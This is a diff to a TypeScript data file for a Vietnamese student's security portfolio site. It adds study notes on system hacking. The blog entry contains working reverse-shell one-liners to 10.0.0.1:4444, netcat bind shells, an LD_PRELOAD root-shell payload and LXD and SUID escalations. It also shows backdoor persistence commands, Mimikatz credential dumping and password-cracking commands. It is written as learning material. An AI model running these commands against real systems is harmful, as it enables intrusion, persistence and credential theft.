@@ -1,5 +1,5 @@
 
-import { Tag, SkillLevel, Activity, Project, Certification } from './types';
+import { Tag, SkillLevel, Activity, Project, Certification, BlogPost } from './types';
 
 export const PROFILE_INFO = {
   fullName: "Đinh Duy Chính",
@@ -16,6 +16,62 @@ export const PROFILE_INFO = {
 };
 
 export const MOCK_ACTIVITIES: Activity[] = [
+  {
+    id: '2025-12-29-system-hacking-deep-dive',
+    date: '2025-12-29',
+    title: 'System Hacking - Tổng hợp kỹ thuật tấn công và phòng thủ',
+    tags: [Tag.READING, Tag.LAB],
+    level: SkillLevel.ADVANCED,
+    images: ['https://picsum.photos/seed/syshack/1200/800'],
+    content: 
+    `### Những gì đã làm
+Nghiên cứu sâu về System Hacking bao gồm Red Team tactics, các phương thức xác thực Windows (NTLM, Kerberos), kỹ thuật leo thang đặc quyền trên Windows và Linux. Thực hành các kỹ thuật tấn công thực tế như Pass the Hash, Password Spraying, và khai thác lỗi cấu hình hệ thống.
+
+### Những gì đã học
+
+#### 1. Red Team Operations
+* **Cyber Attacks**: Sử dụng công nghệ tấn công vào hệ thống máy tính
+* **Social Engineering**: Tấn công yếu tố con người
+* **Physical Security**: Bẻ khóa, phá khóa vật lý (Black Team)
+* **Phương thức tấn công**: OSINT → Truy cập & Thực thi → Leo thang đặc quyền → Lateral Movement → Exfiltration → Domain Takeover
+
+#### 2. Windows Authentication
+* **SAM Database**: Lưu trữ Username, UserID, LM Hash, NTLM Hash
+* **NTLM Authentication**: Giao thức xác thực cũ hơn, dễ bị tấn công Pass the Hash
+* **Kerberos**: Xác thực mạnh hơn với TGT (Ticket Granting Ticket) và TGS (Ticket Granting Service)
+* **Attack Techniques**: Password Spraying, Pass the Hash, Responder Attack
+
+#### 3. Privilege Escalation - Windows
+* **Unquoted Service Paths**: Khai thác đường dẫn dịch vụ không có ngoặc kép
+* **AlwaysInstallElevated**: Lỗi cấu hình Registry cho phép cài đặt MSI với quyền SYSTEM
+* **SeBackupPrivilege**: Sao lưu ntds.dit để dump credentials
+* **Credential Hunting**: Tìm mật khẩu trong Registry, file config, trình duyệt
+* **Tools**: Lazagne, SessionGopher, SharpChrome, lolbas
+
+#### 4. Privilege Escalation - Linux
+* **SUID/SGID Binaries**: Tìm và khai thác các file binary có bit đặc biệt
+* **Sudo Misconfigurations**: Khai thác cấu hình sudo sai (GTFOBins)
+* **Cron Jobs**: Hijack tác vụ định kỳ chạy với quyền root
+* **Kernel Exploits**: DirtyCow, PwnKit cho các lỗ hổng kernel
+* **LXD Container**: Leo thang đặc quyền thông qua container
+* **LD_PRELOAD**: Shared library hijacking
+
+#### 5. Post-Exploitation
+* **Reverse Shell vs Bind Shell**: Hiểu sự khác biệt và khi nào sử dụng
+* **Persistence**: Backdoor, scheduled tasks, registry keys
+* **Credential Dumping**: Mimikatz, /etc/shadow, NTDS.dit
+* **Lateral Movement**: Pass-the-Hash, PSExec, Evil-WinRM
+* **Tools**: Netcat, Metasploit, pspy, Responder
+
+#### 6. Enumeration & Reconnaissance
+* **Network Scanning**: netdiscover, nmap, crackmapexec
+* **Web Scanning**: nikto, dirb, burp suite
+* **Service Enumeration**: SMB, FTP, SSH, HTTP
+* **Information Gathering**: searchsploit, msfconsole
+
+### Bước tiếp theo
+Thực hành trên các lab môi trường thực tế (HackTheBox, TryHackMe). Nghiên cứu sâu về Active Directory exploitation và Domain Takeover. Tham gia các scenario Red Team/Blue Team để hiểu cả hai góc độ tấn công và phòng thủ.`
+  },
   {
     id: '2025-06-20-hutech-attt-competition',
     date: '2025-06-20',
@@ -244,6 +300,283 @@ Học về kiểm tra bảo mật API (REST/GraphQL) và lỗ hổng OAuth 2.0. 
 ### 4.2 Các chủ đề nâng cao: Multicast UDP và Java RMI
 * Multicast UDP: Unicast/Broadcast/Multicast, MulticastSocket, joinGroup.
 * Java RMI: Gọi phương thức từ xa, RMI Registry, Stub/Skeleton.`
+  }
+];
+
+export const MOCK_BLOGS: BlogPost[] = [
+  {
+    id: 'system-hacking-complete-guide',
+    date: 'December 27, 2024',
+    title: 'System Hacking - Tổng hợp kỹ thuật tấn công và phòng thủ',
+    tags: ['Security', 'Red Team', 'Privilege Escalation', 'Post-Exploitation'],
+    level: 'Advanced',
+    content: `## 1. Red Team Operations
+
+### 1.1 OSINT (Open Source Intelligence)
+* Thu thập thông tin từ nguồn công khai
+* Phân tích dữ liệu mạng xã hội
+* Mapping infrastructure và network
+
+### 1.2 Các loại tấn công
+* **Cyber Attacks**: Khai thác lỗ hổng phần mềm, DDoS, malware
+* **Social Engineering**: Phishing, pretexting, baiting
+* **Physical Attacks**: Tailgating, dumpster diving, device theft
+
+### 1.3 Attack Methodology
+1. **Reconnaissance**: Thu thập thông tin mục tiêu
+2. **Weaponization**: Tạo payload và backdoor
+3. **Delivery**: Gửi payload qua email/web/USB
+4. **Exploitation**: Khai thác lỗ hổng để thực thi code
+5. **Installation**: Cài đặt malware/backdoor
+6. **Command & Control**: Thiết lập kênh điều khiển
+7. **Actions on Objectives**: Đạt mục tiêu (exfiltrate data, destroy, etc.)
+
+---
+
+## 2. Windows Authentication
+
+### 2.1 SAM Database
+* **Location**: C:\\Windows\\System32\\config\\SAM
+* Lưu hash mật khẩu local accounts (LM, NTLM)
+* Được mã hóa bằng SYSKEY
+
+### 2.2 NTLM Protocol
+* **Challenge-Response**: Server gửi challenge, client hash password với challenge
+* **Pass the Hash**: Sử dụng hash thay vì plaintext password
+* **Tools**: Mimikatz, Responder, Impacket
+
+### 2.3 Kerberos
+* **Ticket-based authentication**: TGT (Ticket Granting Ticket) → TGS (Service Ticket)
+* **Kerberoasting**: Crack TGS tickets offline để lấy service account password
+* **Golden Ticket**: Forge TGT với KRBTGT hash
+* **Silver Ticket**: Forge TGS cho service cụ thể
+
+### 2.4 Password Attacks
+* **Password Spraying**: Thử 1 password trên nhiều accounts
+* **Brute Force**: Thử nhiều passwords trên 1 account
+* **Credential Stuffing**: Sử dụng leaked credentials
+
+---
+
+## 3. Windows Privilege Escalation
+
+### 3.1 Unquoted Service Paths
+\`\`\`
+sc qc vulnerable-service
+# Path: C:\\Program Files\\My App\\service.exe
+# Windows sẽ thử: C:\\Program.exe, C:\\Program Files\\My.exe
+\`\`\`
+
+### 3.2 Registry Exploits
+**AlwaysInstallElevated**
+\`\`\`
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+# Nếu cả 2 đều = 1, tạo malicious MSI để escalate
+\`\`\`
+
+### 3.3 Token Manipulation
+* **SeBackupPrivilege**: Backup SAM/SYSTEM registry để dump credentials
+* **SeRestorePrivilege**: Restore malicious files vào system folders
+* **SeImpersonatePrivilege**: Impersonate SYSTEM token (JuicyPotato, PrintSpoofer)
+
+### 3.4 Credential Hunting
+\`\`\`powershell
+# Tìm passwords trong files
+findstr /si password *.xml *.ini *.txt *.config
+
+# PowerShell history
+type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
+
+# Cached credentials
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+\`\`\`
+
+### 3.5 Tools
+* **WinPEAS**: Automated enumeration
+* **PowerUp**: PowerShell privilege escalation
+* **Seatbelt**: C# security enumeration
+* **SharpUp**: C# port của PowerUp
+
+---
+
+## 4. Linux Privilege Escalation
+
+### 4.1 SUID/SGID Binaries
+\`\`\`bash
+find / -perm -4000 -type f 2>/dev/null  # SUID
+find / -perm -2000 -type f 2>/dev/null  # SGID
+
+# GTFOBins: Exploit SUID binaries
+/usr/bin/find . -exec /bin/sh -p \\; -quit
+\`\`\`
+
+### 4.2 Sudo Misconfigurations
+\`\`\`bash
+sudo -l  # Check sudo permissions
+
+# LD_PRELOAD exploit
+sudo LD_PRELOAD=/tmp/evil.so find
+\`\`\`
+
+### 4.3 Cron Jobs
+\`\`\`bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# Writable cron scripts
+ls -la /var/spool/cron/crontabs
+\`\`\`
+
+### 4.4 Kernel Exploits
+\`\`\`bash
+uname -a
+searchsploit "Linux Kernel"
+
+# DirtyCOW (CVE-2016-5195)
+# PwnKit (CVE-2021-4034)
+\`\`\`
+
+### 4.5 Special Exploits
+**LXD/LXC Group**
+\`\`\`bash
+lxc init alpine mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+\`\`\`
+
+**LD_PRELOAD Escalation**
+\`\`\`c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+\`\`\`
+
+---
+
+## 5. Post-Exploitation
+
+### 5.1 Reverse Shells
+\`\`\`bash
+# Bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PowerShell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+\`\`\`
+
+### 5.2 Bind Shells
+\`\`\`bash
+nc -lvp 4444 -e /bin/bash  # Linux
+nc -lvp 4444 -e cmd.exe    # Windows
+\`\`\`
+
+### 5.3 Persistence Mechanisms
+**Windows**
+\`\`\`
+# Registry Run keys
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"
+
+# Scheduled Tasks
+schtasks /create /tn "Updater" /tr "C:\\backdoor.exe" /sc onlogon
+
+# Services
+sc create MyService binPath= "C:\\backdoor.exe" start= auto
+\`\`\`
+
+**Linux**
+\`\`\`bash
+# Cron jobs
+echo "* * * * * /tmp/backdoor" | crontab -
+
+# SSH keys
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+
+# .bashrc
+echo "/tmp/backdoor &" >> ~/.bashrc
+\`\`\`
+
+### 5.4 Credential Dumping
+**Mimikatz (Windows)**
+\`\`\`
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::secrets
+\`\`\`
+
+**Linux**
+\`\`\`bash
+# /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+
+# Memory dumps
+grep -a "password" /proc/*/environ
+\`\`\`
+
+### 5.5 Lateral Movement
+* **PSExec**: Execute commands on remote Windows systems
+* **WMI**: Windows Management Instrumentation
+* **WinRM**: Windows Remote Management
+* **SSH**: Secure Shell for Linux/Unix
+
+### 5.6 Tools
+* **Metasploit**: Framework tấn công và post-exploitation
+* **Empire/Covenant**: C2 frameworks
+* **BloodHound**: Active Directory mapping
+* **CrackMapExec**: Network pentesting tool
+
+---
+
+## 6. Enumeration & Reconnaissance
+
+### 6.1 Network Scanning
+\`\`\`bash
+# Nmap
+nmap -sC -sV -oA scan 10.0.0.0/24
+nmap -p- --min-rate 1000 10.0.0.1
+
+# Masscan
+masscan -p1-65535 10.0.0.0/24 --rate=1000
+\`\`\`
+
+### 6.2 Web Application Scanning
+\`\`\`bash
+# Nikto
+nikto -h http://target.com
+
+# Gobuster
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Wfuzz
+wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://target.com/FUZZ
+\`\`\`
+
+### 6.3 Service Enumeration
+* **SMB**: enum4linux, smbclient, smbmap
+* **LDAP**: ldapsearch, windapsearch
+* **SNMP**: snmpwalk, onesixtyone
+* **DNS**: dig, nslookup, dnsenum
+
+### 6.4 Information Gathering
+* **Whois**: Domain registration info
+* **Shodan**: Internet-connected device search
+* **theHarvester**: Email/subdomain harvesting
+* **Recon-ng**: Reconnaissance framework`,
+    images: []
   }
 ];
 
